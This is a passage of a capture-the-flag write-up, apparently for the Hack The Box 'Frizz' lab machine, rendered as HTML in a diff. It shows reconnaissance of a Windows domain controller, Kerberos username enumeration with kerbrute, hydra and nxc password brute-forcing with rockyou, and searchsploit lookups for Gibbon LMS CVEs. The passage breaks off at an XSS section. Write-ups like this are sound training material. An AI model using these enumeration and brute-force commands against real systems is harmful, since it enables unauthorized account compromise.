+<span class="p">|</span><span class="w"> </span>smb2-security-mode:
+<span class="p">|</span><span class="w">   </span><span class="m">3</span>:1:1:
+<span class="p">|</span>_<span class="w">    </span>Message<span class="w"> </span>signing<span class="w"> </span>enabled<span class="w"> </span>and<span class="w"> </span>required
+<span class="p">|</span><span class="w"> </span>smb2-time:
+<span class="p">|</span><span class="w">   </span>date:<span class="w"> </span><span class="m">2025</span>-03-17T03:34:08
+<span class="p">|</span>_<span class="w">  </span>start_date:<span class="w"> </span>N/A
+<span class="p">|</span>_clock-skew:<span class="w"> </span>6h59m59s
+
+Service<span class="w"> </span>detection<span class="w"> </span>performed.<span class="w"> </span>Please<span class="w"> </span>report<span class="w"> </span>any<span class="w"> </span>incorrect<span class="w"> </span>results<span class="w"> </span>at<span class="w"> </span>https://nmap.org/submit/<span class="w"> </span>.
+Nmap<span class="w"> </span><span class="k">done</span>:<span class="w"> </span><span class="m">1</span><span class="w"> </span>IP<span class="w"> </span>address<span class="w"> </span><span class="o">(</span><span class="m">1</span><span class="w"> </span>host<span class="w"> </span>up<span class="o">)</span><span class="w"> </span>scanned<span class="w"> </span><span class="k">in</span><span class="w"> </span><span class="m">58</span>.14<span class="w"> </span>seconds
+</pre></div>
+</div>
+</section>
+<section id="dns-enum">
+<h2>DNS Enum<a class="headerlink" href="#dns-enum" title="Permalink to this heading">#</a></h2>
+<p>Simple DNS Plus is the default on domain controllers, Getting all records.</p>
+<div class="highlight-bash notranslate"><div class="highlight"><pre><span></span>dig<span class="w"> </span>+short<span class="w"> </span>ANY<span class="w"> </span>@10.129.58.161<span class="w"> </span>frizz.htb
+<span class="m">192</span>.168.120.50
+<span class="m">10</span>.129.58.161
+frizzdc.frizz.htb.
+frizzdc.frizz.htb.<span class="w"> </span>hostmaster.frizz.htb.<span class="w"> </span><span class="m">114</span><span class="w"> </span><span class="m">900</span><span class="w"> </span><span class="m">600</span><span class="w"> </span><span class="m">86400</span><span class="w"> </span><span class="m">3600</span>
+dead:beef::1f98:f30e:e1e3:79b4
+</pre></div>
+</div>
+<p>Adding everything we found so far to my hosts file.</p>
+<div class="highlight-bash notranslate"><div class="highlight"><pre><span></span><span class="m">10</span>.129.58.161<span class="w">   </span>hostmaster.frizz.htb<span class="w"> </span>frizzdc.frizz.htb<span class="w"> </span>frizz.htb<span class="w"> </span>FRIZZDC
+</pre></div>
+</div>
+</section>
+<section id="smb-enum">
+<h2>SMB Enum<a class="headerlink" href="#smb-enum" title="Permalink to this heading">#</a></h2>
+<p>Trying a few things for potential non authenticated access to the shares, but nope</p>
+<div class="highlight-bash notranslate"><div class="highlight"><pre><span></span>smbclient<span class="w"> </span>-N<span class="w"> </span>-L<span class="w"> </span>//10.129.58.161
+nxc<span class="w"> </span>smb<span class="w"> </span><span class="m">10</span>.129.58.161<span class="w"> </span>-u<span class="w"> </span><span class="s1">&#39;&#39;</span><span class="w"> </span>-p<span class="w"> </span><span class="s1">&#39;&#39;</span><span class="w"> </span>--shares
+nxc<span class="w"> </span>smb<span class="w"> </span><span class="m">10</span>.129.58.161<span class="w"> </span>-u<span class="w"> </span><span class="s1">&#39;guest&#39;</span><span class="w"> </span>-p<span class="w"> </span><span class="s1">&#39;&#39;</span><span class="w"> </span>--shares
+nxc<span class="w"> </span>smb<span class="w"> </span><span class="m">10</span>.129.58.161<span class="w"> </span>-u<span class="w"> </span><span class="s1">&#39;guest&#39;</span><span class="w"> </span>-p<span class="w"> </span><span class="s1">&#39;asdf&#39;</span><span class="w"> </span>--shares
+</pre></div>
+</div>
+</section>
+<section id="kerberos-user-enum">
+<h2>Kerberos User Enum<a class="headerlink" href="#kerberos-user-enum" title="Permalink to this heading">#</a></h2>
+<p>Launching a user enum bruteforce in the background</p>
+<div class="highlight-bash notranslate"><div class="highlight"><pre><span></span>kerbrute<span class="w"> </span>userenum<span class="w"> </span><span class="se">\</span>
+<span class="w">  </span>-d<span class="w"> </span>frizz.htb<span class="w"> </span><span class="se">\</span>
+<span class="w">  </span>--dc<span class="w"> </span><span class="m">10</span>.129.58.161<span class="w"> </span><span class="se">\</span>
+<span class="w">  </span>-o<span class="w"> </span>valid_ad_users<span class="w"> </span><span class="se">\</span>
+<span class="w">  </span>/usr/share/seclists-git/Usernames/xato-net-10-million-usernames-dup.txt
+</pre></div>
+</div>
+</section>
+<section id="ssh-enum">
+<h2>SSH Enum<a class="headerlink" href="#ssh-enum" title="Permalink to this heading">#</a></h2>
+<p>That’s not typically something common, but it’s there</p>
+<div class="highlight-bash notranslate"><div class="highlight"><pre><span></span>nc<span class="w"> </span>frizz.htb<span class="w"> </span><span class="m">22</span>
+SSH-2.0-OpenSSH_for_Windows_9.5
+</pre></div>
+</div>
+<p>Password auth is not enabled</p>
+<div class="highlight-bash notranslate"><div class="highlight"><pre><span></span>ssh<span class="w"> </span>f.frizzle@frizz.htb
+</pre></div>
+</div>
+<div class="highlight-default notranslate"><div class="highlight"><pre><span></span>The authenticity of host &#39;frizz.htb (10.129.58.161)&#39; can&#39;t be established.
+ED25519 key fingerprint is SHA256:667C2ZBnjXAV13iEeKUgKhu6w5axMrhU346z2L2OE7g.
+This key is not known by any other names.
+Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
+Warning: Permanently added &#39;frizz.htb&#39; (ED25519) to the list of known hosts.
+f.frizzle@frizz.htb: Permission denied (gssapi-with-mic,keyboard-interactive).
+</pre></div>
+</div>
+</section>
+<section id="apache-web-server">
+<h2>Apache Web Server<a class="headerlink" href="#apache-web-server" title="Permalink to this heading">#</a></h2>
+<p>Now that’s weird, that kinda stands out on a windows box but looking at the http headers, just like ssh it looks like it’s installed on windows rather than a container, navigating to the <a class="reference external" href="http://frizzdc.frizz.htb/home/">homepage</a></p>
+<p>lol</p>
+<div class="highlight-bash notranslate"><div class="highlight"><pre><span></span>wl-paste<span class="w"> </span><span class="p">|</span>base64<span class="w"> </span>-d
+</pre></div>
+</div>
+<div class="highlight-default notranslate"><div class="highlight"><pre><span></span><span class="n">Want</span> <span class="n">to</span> <span class="n">learn</span> <span class="n">hacking</span> <span class="n">but</span> <span class="n">don</span><span class="s1">&#39;t want to go to jail? You&#39;</span><span class="n">ll</span> <span class="n">learn</span> <span class="n">the</span> <span class="ow">in</span><span class="s1">&#39;s and outs of Syscalls and XSS from the safety of international waters and iron clad contracts from your customers, reviewed by Walkerville&#39;</span><span class="n">s</span> <span class="n">finest</span> <span class="n">attorneys</span><span class="o">.</span>
+</pre></div>
+</div>
+<p>An LMS is a Learning Management System or something</p>
+<ul class="simple">
+<li><p><a class="reference external" href="http://frizzdc.frizz.htb/Gibbon-LMS/">http://frizzdc.frizz.htb/Gibbon-LMS/</a></p></li>
+<li><p>Powered by Gibbon v25.0.00</p></li>
+</ul>
+<p>Potentially/maybe important information</p>
+<div class="highlight-default notranslate"><div class="highlight"><pre><span></span><span class="o">*</span><span class="n">NOTICE</span><span class="o">**</span> <span class="n">Due</span> <span class="n">to</span> <span class="n">unplanned</span> <span class="n">Pentesting</span> <span class="n">by</span> <span class="n">students</span><span class="p">,</span> <span class="n">WES</span> <span class="ow">is</span> <span class="n">migrating</span> <span class="n">applications</span> <span class="ow">and</span> <span class="n">tools</span> <span class="n">to</span> <span class="n">stronger</span> <span class="n">security</span> <span class="n">protocols</span><span class="o">.</span> <span class="n">During</span> <span class="n">this</span> <span class="n">transition</span><span class="p">,</span> <span class="n">Ms</span><span class="o">.</span> <span class="n">Fiona</span> <span class="n">Frizzle</span> <span class="n">will</span> <span class="n">be</span> <span class="n">migrating</span> <span class="n">Gibbon</span> <span class="n">to</span> <span class="n">utilize</span> <span class="n">our</span> <span class="n">Azure</span> <span class="n">Active</span> <span class="n">Directory</span> <span class="n">SSO</span><span class="o">.</span> <span class="n">Please</span> <span class="n">note</span> <span class="n">this</span> <span class="n">might</span> <span class="n">take</span> <span class="mi">48</span> <span class="n">hours</span> <span class="n">where</span> <span class="n">your</span> <span class="n">accounts</span> <span class="n">will</span> <span class="ow">not</span> <span class="n">be</span> <span class="n">available</span><span class="o">.</span> <span class="n">Please</span> <span class="n">bear</span> <span class="k">with</span> <span class="n">us</span><span class="p">,</span> <span class="ow">and</span> <span class="n">thank</span> <span class="n">you</span> <span class="k">for</span> <span class="n">your</span> <span class="n">patience</span><span class="o">.</span> <span class="n">Anything</span> <span class="n">that</span> <span class="n">can</span> <span class="ow">not</span> <span class="n">utilize</span> <span class="n">Azure</span> <span class="n">AD</span> <span class="n">will</span> <span class="n">use</span> <span class="n">the</span> <span class="n">strongest</span> <span class="n">available</span> <span class="n">protocols</span> <span class="n">such</span> <span class="k">as</span> <span class="n">Kerberos</span><span class="o">.</span> 
+</pre></div>
+</div>
+<p>We’re on v25</p>
+<div class="highlight-bash notranslate"><div class="highlight"><pre><span></span>searchsploit<span class="w"> </span>gibbon
+--------------------------------------------------<span class="w"> </span>--------------------------
+<span class="w"> </span>Exploit<span class="w"> </span>Title<span class="w">                                    </span><span class="p">|</span><span class="w">  </span>Path
+--------------------------------------------------<span class="w"> </span>--------------------------
+Gibbon<span class="w"> </span>LMS<span class="w"> </span>&lt;<span class="w"> </span>v26.0.00<span class="w"> </span>-<span class="w"> </span>Authenticated<span class="w"> </span>RCE<span class="w">         </span><span class="p">|</span><span class="w"> </span>php/webapps/51903.py
+Gibbon<span class="w"> </span>LMS<span class="w"> </span>v26.0.00<span class="w"> </span>-<span class="w"> </span>SSTI<span class="w"> </span>vulnerability<span class="w">          </span><span class="p">|</span><span class="w"> </span>php/webapps/51962.txt
+--------------------------------------------------<span class="w"> </span>--------------------------
+Shellcodes:<span class="w"> </span>No<span class="w"> </span>Results
+</pre></div>
+</div>
+<p>So those may be interesting to explore</p>
+<div class="highlight-bash notranslate"><div class="highlight"><pre><span></span>searchsploit<span class="w"> </span>-m<span class="w"> </span>php/webapp/51903.py
+searchsploit<span class="w"> </span>-m<span class="w"> </span>php/webapp/51962.txt
+</pre></div>
+</div>
+<p>The RCE is authenticated and we don’t have an account yet, so I’m looking at the SSTI first, the both seem to be related as they have been found by the same ppl and their CVE numbers are back to back</p>
+<ul class="simple">
+<li><p>ssti = <a class="reference external" href="https://packetstorm.news/files/id/177857">CVE-2024-24724</a></p></li>
+<li><p>rce = <a class="reference external" href="https://packetstorm.news/files/id/177635/">CVE-2024-24725</a></p></li>
+</ul>
+<p>Nevermind, looking at the code of the ssti this needs a username and password too, so we need a valid username and password, lets look at the login flow in burp, it’s a php site and the login page expects data in multipart form</p>
+<p>The Login page, since the mail password are incorrect we get a 302 found and we’re sent back to <code class="docutils literal notranslate"><span class="pre">http://frizzdc.frizz.htb/Gibbon-LMS/index.php?loginReturn=fail</span></code></p>
+<div class="highlight-default notranslate"><div class="highlight"><pre><span></span>POST /Gibbon-LMS/login.php?loginReturn=fail1 HTTP/1.1
+Host: frizzdc.frizz.htb
+User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:136.0) Gecko/20100101 Firefox/136.0
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
+Accept-Language: en-US,en;q=0.5
+Accept-Encoding: gzip, deflate, br
+Content-Type: multipart/form-data; boundary=----geckoformboundarya1b1e45a2b21183b60a5ec6cfd4c3be4
+Content-Length: 766
+Origin: http://frizzdc.frizz.htb
+Connection: close
+Referer: http://frizzdc.frizz.htb/Gibbon-LMS/index.php?loginReturn=fail1
+Cookie: G60fa1cd0af7be78b=1ulfv4rkdrqlvd3cu3vnea1j9b
+Upgrade-Insecure-Requests: 1
+Priority: u=0, i
+
+------geckoformboundarya1b1e45a2b21183b60a5ec6cfd4c3be4
+Content-Disposition: form-data; name=&quot;address&quot;
+
+------geckoformboundarya1b1e45a2b21183b60a5ec6cfd4c3be4
+Content-Disposition: form-data; name=&quot;method&quot;
+
+default
+
+------geckoformboundarya1b1e45a2b21183b60a5ec6cfd4c3be4
+Content-Disposition: form-data; name=&quot;username&quot;
+
+niet@frizz.htb
+
+------geckoformboundarya1b1e45a2b21183b60a5ec6cfd4c3be4
+Content-Disposition: form-data; name=&quot;password&quot;
+
+whatever
+
+------geckoformboundarya1b1e45a2b21183b60a5ec6cfd4c3be4
+Content-Disposition: form-data; name=&quot;gibbonSchoolYearID&quot;
+
+025
+
+------geckoformboundarya1b1e45a2b21183b60a5ec6cfd4c3be4
+Content-Disposition: form-data; name=&quot;gibboni18nID&quot;
+
+0002
+
+------geckoformboundarya1b1e45a2b21183b60a5ec6cfd4c3be4--
+
+</pre></div>
+</div>
+<p>If we try the forgot password button, that’s what gets sent, we get a 200 nothing really seems to happen on the browser side, we just remain on the index.ph page.</p>
+<div class="highlight-bash notranslate"><div class="highlight"><pre><span></span>GET<span class="w"> </span>/Gibbon-LMS/index.php?q<span class="o">=</span>passwordReset.php<span class="w"> </span>HTTP/1.1
+Host:<span class="w"> </span>frizzdc.frizz.htb
+User-Agent:<span class="w"> </span>Mozilla/5.0<span class="w"> </span><span class="o">(</span>X11<span class="p">;</span><span class="w"> </span>Linux<span class="w"> </span>x86_64<span class="p">;</span><span class="w"> </span>rv:136.0<span class="o">)</span><span class="w"> </span>Gecko/20100101<span class="w"> </span>Firefox/136.0
+Accept:<span class="w"> </span>text/html,application/xhtml+xml,application/xml<span class="p">;</span><span class="nv">q</span><span class="o">=</span><span class="m">0</span>.9,*/*<span class="p">;</span><span class="nv">q</span><span class="o">=</span><span class="m">0</span>.8
+Accept-Language:<span class="w"> </span>en-US,en<span class="p">;</span><span class="nv">q</span><span class="o">=</span><span class="m">0</span>.5
+Accept-Encoding:<span class="w"> </span>gzip,<span class="w"> </span>deflate,<span class="w"> </span>br
+Connection:<span class="w"> </span>close
+Referer:<span class="w"> </span>http://frizzdc.frizz.htb/Gibbon-LMS/index.php?loginReturn<span class="o">=</span>fail1
+Cookie:<span class="w"> </span><span class="nv">G60fa1cd0af7be78b</span><span class="o">=</span>1ulfv4rkdrqlvd3cu3vnea1j9b
+Upgrade-Insecure-Requests:<span class="w"> </span><span class="m">1</span>
+Priority:<span class="w"> </span><span class="nv">u</span><span class="o">=</span><span class="m">0</span>,<span class="w"> </span>i
+</pre></div>
+</div>
+<p>Could this be something similar to this other box? <a class="reference external" href="https://blnknlights.github.io/htb/machines/medium/forgot/forgot.html#forgot-password-feature">forgot.htb</a></p>
+<div class="highlight-bash notranslate"><div class="highlight"><pre><span></span><span class="o">[</span><span class="m">22</span>:37:17<span class="o">]</span><span class="w"> </span><span class="m">500</span><span class="w"> </span>-<span class="w">  </span>631B<span class="w">  </span>-<span class="w"> </span>/cgi-bin/printenv.pl
+<span class="o">[</span><span class="m">22</span>:37:58<span class="o">]</span><span class="w"> </span><span class="m">301</span><span class="w"> </span>-<span class="w">  </span>329B<span class="w">  </span>-<span class="w"> </span>/home<span class="w">  </span>-&gt;<span class="w">  </span>http://frizz.htb/home/
+</pre></div>
+</div>
+<div class="highlight-bash notranslate"><div class="highlight"><pre><span></span>curl<span class="w"> </span>-i<span class="w"> </span>http://frizz.htb/cgi-bin/printenv.pl
+HTTP/1.1<span class="w"> </span><span class="m">500</span><span class="w"> </span>Internal<span class="w"> </span>Server<span class="w"> </span>Error
+Date:<span class="w"> </span>Mon,<span class="w"> </span><span class="m">17</span><span class="w"> </span>Mar<span class="w"> </span><span class="m">2025</span><span class="w"> </span><span class="m">05</span>:39:46<span class="w"> </span>GMT
+Server:<span class="w"> </span>Apache/2.4.58<span class="w"> </span><span class="o">(</span>Win64<span class="o">)</span><span class="w"> </span>OpenSSL/3.1.3<span class="w"> </span>PHP/8.2.12
+Content-Length:<span class="w"> </span><span class="m">631</span>
+Connection:<span class="w"> </span>close
+Content-Type:<span class="w"> </span>text/html<span class="p">;</span><span class="w"> </span><span class="nv">charset</span><span class="o">=</span>iso-8859-1
+
+&lt;!DOCTYPE<span class="w"> </span>HTML<span class="w"> </span>PUBLIC<span class="w"> </span><span class="s2">&quot;-//IETF//DTD HTML 2.0//EN&quot;</span>&gt;
+&lt;html&gt;&lt;head&gt;
+&lt;title&gt;500<span class="w"> </span>Internal<span class="w"> </span>Server<span class="w"> </span>Error&lt;/title&gt;
+&lt;/head&gt;&lt;body&gt;
+&lt;h1&gt;Internal<span class="w"> </span>Server<span class="w"> </span>Error&lt;/h1&gt;
+&lt;p&gt;The<span class="w"> </span>server<span class="w"> </span>encountered<span class="w"> </span>an<span class="w"> </span>internal<span class="w"> </span>error<span class="w"> </span>or
+misconfiguration<span class="w"> </span>and<span class="w"> </span>was<span class="w"> </span>unable<span class="w"> </span>to<span class="w"> </span><span class="nb">complete</span>
+your<span class="w"> </span>request.&lt;/p&gt;
+&lt;p&gt;Please<span class="w"> </span>contact<span class="w"> </span>the<span class="w"> </span>server<span class="w"> </span>administrator<span class="w"> </span>at
+<span class="w"> </span>f.frizzle@frizz.htb<span class="w"> </span>to<span class="w"> </span>inform<span class="w"> </span>them<span class="w"> </span>of<span class="w"> </span>the<span class="w"> </span><span class="nb">time</span><span class="w"> </span>this<span class="w"> </span>error<span class="w"> </span>occurred,
+<span class="w"> </span>and<span class="w"> </span>the<span class="w"> </span>actions<span class="w"> </span>you<span class="w"> </span>performed<span class="w"> </span>just<span class="w"> </span>before<span class="w"> </span>this<span class="w"> </span>error.&lt;/p&gt;
+&lt;p&gt;More<span class="w"> </span>information<span class="w"> </span>about<span class="w"> </span>this<span class="w"> </span>error<span class="w"> </span>may<span class="w"> </span>be<span class="w"> </span>available
+<span class="k">in</span><span class="w"> </span>the<span class="w"> </span>server<span class="w"> </span>error<span class="w"> </span>log.&lt;/p&gt;
+&lt;hr&gt;
+&lt;address&gt;Apache/2.4.58<span class="w"> </span><span class="o">(</span>Win64<span class="o">)</span><span class="w"> </span>OpenSSL/3.1.3<span class="w"> </span>PHP/8.2.12<span class="w"> </span>Server<span class="w"> </span>at<span class="w"> </span>frizz.htb<span class="w"> </span>Port<span class="w"> </span><span class="m">80</span>&lt;/address&gt;
+&lt;/body&gt;&lt;/html&gt;
+</pre></div>
+</div>
+<p>The 500 error message gives us fiona’s email, and by extension her samaccountname</p>
+<div class="highlight-bash notranslate"><div class="highlight"><pre><span></span>kerbrute<span class="w"> </span>userenum<span class="w"> </span><span class="se">\</span>
+<span class="w">  </span>-d<span class="w"> </span>frizz.htb<span class="w"> </span><span class="se">\</span>
+<span class="w">  </span>--dc<span class="w"> </span><span class="m">10</span>.129.58.161<span class="w"> </span><span class="se">\</span>
+<span class="w">  </span>valid_ad_users
+
+<span class="w">    </span>__<span class="w">             </span>__<span class="w">               </span>__
+<span class="w">   </span>/<span class="w"> </span>/_____<span class="w">  </span>_____/<span class="w"> </span>/_<span class="w">  </span>_______<span class="w">  </span>__/<span class="w"> </span>/____
+<span class="w">  </span>/<span class="w"> </span>//_/<span class="w"> </span>_<span class="w"> </span><span class="se">\/</span><span class="w"> </span>___/<span class="w"> </span>__<span class="w"> </span><span class="se">\/</span><span class="w"> </span>___/<span class="w"> </span>/<span class="w"> </span>/<span class="w"> </span>/<span class="w"> </span>__/<span class="w"> </span>_<span class="w"> </span><span class="se">\</span>
+<span class="w"> </span>/<span class="w"> </span>,&lt;<span class="w"> </span>/<span class="w">  </span>__/<span class="w"> </span>/<span class="w">  </span>/<span class="w"> </span>/_/<span class="w"> </span>/<span class="w"> </span>/<span class="w">  </span>/<span class="w"> </span>/_/<span class="w"> </span>/<span class="w"> </span>/_/<span class="w">  </span>__/
+/_/<span class="p">|</span>_<span class="p">|</span><span class="se">\_</span>__/_/<span class="w">  </span>/_.___/_/<span class="w">   </span><span class="se">\_</span>_,_/<span class="se">\_</span>_/<span class="se">\_</span>__/
+
+Version:<span class="w"> </span>v1.0.3<span class="w"> </span><span class="o">(</span>9dad6e1<span class="o">)</span><span class="w"> </span>-<span class="w"> </span><span class="m">03</span>/16/25<span class="w"> </span>-<span class="w"> </span>Ronnie<span class="w"> </span>Flathers<span class="w"> </span>@ropnop
+
+<span class="m">2025</span>/03/16<span class="w"> </span><span class="m">22</span>:42:55<span class="w"> </span>&gt;<span class="w">  </span>Using<span class="w"> </span>KDC<span class="o">(</span>s<span class="o">)</span>:
+<span class="m">2025</span>/03/16<span class="w"> </span><span class="m">22</span>:42:55<span class="w"> </span>&gt;<span class="w">  	</span><span class="m">10</span>.129.58.161:88
+
+<span class="m">2025</span>/03/16<span class="w"> </span><span class="m">22</span>:42:55<span class="w"> </span>&gt;<span class="w">  </span><span class="o">[</span>+<span class="o">]</span><span class="w"> </span>VALID<span class="w"> </span>USERNAME:<span class="w">	 </span>f.frizzle@frizz.htb
+<span class="m">2025</span>/03/16<span class="w"> </span><span class="m">22</span>:42:55<span class="w"> </span>&gt;<span class="w">  </span><span class="o">[</span>+<span class="o">]</span><span class="w"> </span>VALID<span class="w"> </span>USERNAME:<span class="w">	 </span>administrator@frizz.htb
+<span class="m">2025</span>/03/16<span class="w"> </span><span class="m">22</span>:42:55<span class="w"> </span>&gt;<span class="w">  </span>Done!<span class="w"> </span>Tested<span class="w"> </span><span class="m">4</span><span class="w"> </span>usernames<span class="w"> </span><span class="o">(</span><span class="m">2</span><span class="w"> </span>valid<span class="o">)</span><span class="w"> </span><span class="k">in</span><span class="w"> </span><span class="m">0</span>.051<span class="w"> </span>seconds
+</pre></div>
+</div>
+<p>We can also guess a few other characters from googling about the magic schoolbus</p>
+<div class="highlight-bash notranslate"><div class="highlight"><pre><span></span>kerbrute<span class="w"> </span>userenum<span class="w"> </span><span class="se">\</span>
+<span class="w">  </span>-d<span class="w"> </span>frizz.htb<span class="w"> </span><span class="se">\</span>
+<span class="w">  </span>--dc<span class="w"> </span><span class="m">10</span>.129.58.161<span class="w"> </span><span class="se">\</span>
+<span class="w">  </span>users
+
+<span class="w">    </span>__<span class="w">             </span>__<span class="w">               </span>__
+<span class="w">   </span>/<span class="w"> </span>/_____<span class="w">  </span>_____/<span class="w"> </span>/_<span class="w">  </span>_______<span class="w">  </span>__/<span class="w"> </span>/____
+<span class="w">  </span>/<span class="w"> </span>//_/<span class="w"> </span>_<span class="w"> </span><span class="se">\/</span><span class="w"> </span>___/<span class="w"> </span>__<span class="w"> </span><span class="se">\/</span><span class="w"> </span>___/<span class="w"> </span>/<span class="w"> </span>/<span class="w"> </span>/<span class="w"> </span>__/<span class="w"> </span>_<span class="w"> </span><span class="se">\</span>
+<span class="w"> </span>/<span class="w"> </span>,&lt;<span class="w"> </span>/<span class="w">  </span>__/<span class="w"> </span>/<span class="w">  </span>/<span class="w"> </span>/_/<span class="w"> </span>/<span class="w"> </span>/<span class="w">  </span>/<span class="w"> </span>/_/<span class="w"> </span>/<span class="w"> </span>/_/<span class="w">  </span>__/
+/_/<span class="p">|</span>_<span class="p">|</span><span class="se">\_</span>__/_/<span class="w">  </span>/_.___/_/<span class="w">   </span><span class="se">\_</span>_,_/<span class="se">\_</span>_/<span class="se">\_</span>__/
+
+Version:<span class="w"> </span>v1.0.3<span class="w"> </span><span class="o">(</span>9dad6e1<span class="o">)</span><span class="w"> </span>-<span class="w"> </span><span class="m">03</span>/16/25<span class="w"> </span>-<span class="w"> </span>Ronnie<span class="w"> </span>Flathers<span class="w"> </span>@ropnop
+
+<span class="m">2025</span>/03/16<span class="w"> </span><span class="m">22</span>:55:13<span class="w"> </span>&gt;<span class="w">  </span>Using<span class="w"> </span>KDC<span class="o">(</span>s<span class="o">)</span>:
+<span class="m">2025</span>/03/16<span class="w"> </span><span class="m">22</span>:55:13<span class="w"> </span>&gt;<span class="w">  	</span><span class="m">10</span>.129.58.161:88
+
+<span class="m">2025</span>/03/16<span class="w"> </span><span class="m">22</span>:55:13<span class="w"> </span>&gt;<span class="w">  </span><span class="o">[</span>+<span class="o">]</span><span class="w"> </span>VALID<span class="w"> </span>USERNAME:<span class="w">	 </span>v.frizzle@frizz.htb
+<span class="m">2025</span>/03/16<span class="w"> </span><span class="m">22</span>:55:13<span class="w"> </span>&gt;<span class="w">  </span><span class="o">[</span>+<span class="o">]</span><span class="w"> </span>VALID<span class="w"> </span>USERNAME:<span class="w">	 </span>administrator@frizz.htb
+<span class="m">2025</span>/03/16<span class="w"> </span><span class="m">22</span>:55:13<span class="w"> </span>&gt;<span class="w">  </span><span class="o">[</span>+<span class="o">]</span><span class="w"> </span>VALID<span class="w"> </span>USERNAME:<span class="w">	 </span>c.ramon@frizz.htb
+<span class="m">2025</span>/03/16<span class="w"> </span><span class="m">22</span>:55:13<span class="w"> </span>&gt;<span class="w">  </span><span class="o">[</span>+<span class="o">]</span><span class="w"> </span>VALID<span class="w"> </span>USERNAME:<span class="w">	 </span>p.terese@frizz.htb
+<span class="m">2025</span>/03/16<span class="w"> </span><span class="m">22</span>:55:13<span class="w"> </span>&gt;<span class="w">  </span><span class="o">[</span>+<span class="o">]</span><span class="w"> </span>VALID<span class="w"> </span>USERNAME:<span class="w">	 </span>a.perlstein@frizz.htb
+<span class="m">2025</span>/03/16<span class="w"> </span><span class="m">22</span>:55:13<span class="w"> </span>&gt;<span class="w">  </span><span class="o">[</span>+<span class="o">]</span><span class="w"> </span>VALID<span class="w"> </span>USERNAME:<span class="w">	 </span>w.li@frizz.htb
+<span class="m">2025</span>/03/16<span class="w"> </span><span class="m">22</span>:55:13<span class="w"> </span>&gt;<span class="w">  </span><span class="o">[</span>+<span class="o">]</span><span class="w"> </span>VALID<span class="w"> </span>USERNAME:<span class="w">	 </span>f.frizzle@frizz.htb
+<span class="m">2025</span>/03/16<span class="w"> </span><span class="m">22</span>:55:13<span class="w"> </span>&gt;<span class="w">  </span><span class="o">[</span>+<span class="o">]</span><span class="w"> </span>VALID<span class="w"> </span>USERNAME:<span class="w">	 </span>d.hudson@frizz.htb
+<span class="m">2025</span>/03/16<span class="w"> </span><span class="m">22</span>:55:13<span class="w"> </span>&gt;<span class="w">  </span>Done!<span class="w"> </span>Tested<span class="w"> </span><span class="m">8</span><span class="w"> </span>usernames<span class="w"> </span><span class="o">(</span><span class="m">8</span><span class="w"> </span>valid<span class="o">)</span><span class="w"> </span><span class="k">in</span><span class="w"> </span><span class="m">0</span>.041<span class="w"> </span>seconds
+</pre></div>
+</div>
+<div class="highlight-bash notranslate"><div class="highlight"><pre><span></span>hydra<span class="w"> </span><span class="se">\</span>
+<span class="w">  </span>-L<span class="w"> </span>loot/emails<span class="w"> </span><span class="se">\</span>
+<span class="w">  </span>-P<span class="w"> </span>~/.local/share/seclists/rockyou.txt<span class="w"> </span><span class="se">\</span>
+<span class="w">  </span><span class="m">10</span>.10.11.42<span class="w"> </span><span class="se">\</span>
+<span class="w">  </span>ldap2<span class="w"> </span><span class="se">\</span>
+<span class="w">  </span>-V<span class="w"> </span><span class="se">\</span>
+<span class="w">  </span>-f
+</pre></div>
+</div>
+<div class="highlight-bash notranslate"><div class="highlight"><pre><span></span>nxc<span class="w"> </span>ldap<span class="w"> </span><span class="m">10</span>.129.58.161<span class="w"> </span><span class="se">\</span>
+<span class="w">  </span>-u<span class="w"> </span>loot/emails<span class="w"> </span><span class="se">\</span>
+<span class="w">  </span>-p<span class="w"> </span>~/.local/share/seclists/rockyou.txt<span class="w"> </span><span class="se">\</span>
+<span class="w">  </span>--ignore-pw-decoding
+</pre></div>
+</div>
+</section>
+<section id="those-are-the-cves-i-played-with">
+<h2>Those are the CVEs I played with<a class="headerlink" href="#those-are-the-cves-i-played-with" title="Permalink to this heading">#</a></h2>
+<div class="highlight-default notranslate"><div class="highlight"><pre><span></span>         <span class="n">ssti</span> <span class="o">=</span> <span class="p">[</span><span class="n">CVE</span><span class="o">-</span><span class="mi">2024</span><span class="o">-</span><span class="mi">24724</span><span class="p">](</span><span class="n">https</span><span class="p">:</span><span class="o">//</span><span class="n">packetstorm</span><span class="o">.</span><span class="n">news</span><span class="o">/</span><span class="n">files</span><span class="o">/</span><span class="nb">id</span><span class="o">/</span><span class="mi">177857</span><span class="p">)</span>
+          <span class="n">rce</span> <span class="o">=</span> <span class="p">[</span><span class="n">CVE</span><span class="o">-</span><span class="mi">2024</span><span class="o">-</span><span class="mi">24725</span><span class="p">](</span><span class="n">https</span><span class="p">:</span><span class="o">//</span><span class="n">packetstorm</span><span class="o">.</span><span class="n">news</span><span class="o">/</span><span class="n">files</span><span class="o">/</span><span class="nb">id</span><span class="o">/</span><span class="mi">177635</span><span class="o">/</span><span class="p">)</span>
+          <span class="n">xss</span> <span class="o">=</span> <span class="p">[</span><span class="n">CVE</span><span class="o">-</span><span class="mi">2023</span><span class="o">-</span><span class="mi">45881</span><span class="p">](</span><span class="n">https</span><span class="p">:</span><span class="o">//</span><span class="n">herolab</span><span class="o">.</span><span class="n">usd</span><span class="o">.</span><span class="n">de</span><span class="o">/</span><span class="n">security</span><span class="o">-</span><span class="n">advisories</span><span class="o">/</span><span class="n">usd</span><span class="o">-</span><span class="mi">2023</span><span class="o">-</span><span class="mi">0024</span><span class="o">/</span><span class="p">)</span>
+  <span class="n">file</span> <span class="n">write</span>  <span class="o">=</span> <span class="p">[</span><span class="n">CVE</span><span class="o">-</span><span class="mi">2023</span><span class="o">-</span><span class="mi">45878</span><span class="p">](</span><span class="n">https</span><span class="p">:</span><span class="o">//</span><span class="n">herolab</span><span class="o">.</span><span class="n">usd</span><span class="o">.</span><span class="n">de</span><span class="o">/</span><span class="n">security</span><span class="o">-</span><span class="n">advisories</span><span class="o">/</span><span class="n">usd</span><span class="o">-</span><span class="mi">2023</span><span class="o">-</span><span class="mi">0025</span><span class="o">/</span><span class="p">)</span>
+</pre></div>
+</div>
+</section>
+<section id="cve-2023-45881-xss-unsuccessfull">
+<h2>CVE-2023-45881 - XSS (Unsuccessfull)<a class="headerlink" href="#cve-2023-45881-xss-unsuccessfull" title="Permalink to this heading">#</a></h2>
+<ul class="simple">
